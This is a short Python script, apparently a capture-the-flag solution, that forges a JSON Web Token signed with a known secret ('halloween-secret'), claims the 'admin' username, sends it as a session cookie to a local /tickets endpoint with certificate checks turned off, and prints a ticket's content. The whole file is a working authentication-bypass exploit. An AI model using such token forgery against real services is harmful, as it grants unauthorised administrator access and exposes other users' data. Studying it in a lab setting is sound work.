import jwt
import requests

secret = 'halloween-secret'
data ={ 'username': 'admin' }
token = jwt.encode(data, secret, algorithm='HS256')

cookies = { 'session_token': token }

r = requests.get('https://localhost:1337/tickets', cookies=cookies, verify=False)

print(f'{r.json()["tickets"][2]["content"]=}')